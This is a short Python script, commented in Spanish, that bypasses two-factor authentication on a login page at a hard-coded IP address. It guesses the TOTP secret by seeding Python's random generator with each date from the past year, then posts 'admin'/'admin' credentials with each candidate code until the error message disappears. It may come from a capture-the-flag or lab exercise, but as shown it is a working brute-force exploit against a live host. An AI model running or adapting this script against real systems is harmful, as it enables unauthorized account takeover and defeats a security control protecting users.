import pyotp
import datetime
import random
import requests

# Genera TOTP secret basado en una fecha específica
def generate_totp_secret(date):
    random.seed(date.strftime('%m-%d-%Y'))
    secret_alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567abcdef'
    return ''.join([random.choice(secret_alpha) for _ in range(40)])

# Prueba múltiples fechas y ventanas de tiempo para el TOTP
def try_totp_for_dates(days_back=7, time_window=2):
    url = "http://45.164.23.212:3000/"
    today = datetime.datetime.today()

    for i in range(days_back):
        # Intentar con varias fechas anteriores
        date_to_try = today - datetime.timedelta(days=i)
        totp_secret = generate_totp_secret(date_to_try)
        totp = pyotp.TOTP(totp_secret)

        # Probar con la ventana temporal (actual, anterior, y siguiente)
        for j in range(-time_window, time_window + 1):
            current_totp = totp.at(datetime.datetime.now() + datetime.timedelta(seconds=j * 30))
            
            # Imprimir información de depuración
            print(f"Date: {date_to_try.strftime('%m-%d-%Y')}, TOTP: {current_totp}")
            
            # Enviar petición POST con credenciales y código TOTP generado
            data = {
                'username': 'admin',
                'password': 'admin',
                'totp': current_totp
            }
            
            # Intentar autenticarse
            response = requests.post(url, data=data)
            
            # Verificar si el intento fue exitoso
            if "2FA code is incorrect" not in response.text:
                print(f"Success! TOTP worked for date: {date_to_try.strftime('%m-%d-%Y')}, Window: {j * 30} seconds")
                print(response.text)
                return
            else:
                print(f"2FA code is incorrect for date: {date_to_try.strftime('%m-%d-%Y')}, Window: {j * 30} seconds")
    
    print("No valid TOTP found for the past", days_back, "days.")

# Probar los últimos 365 días y una ventana temporal de +/- 30 segundos
try_totp_for_dates(days_back=365, time_window=1)
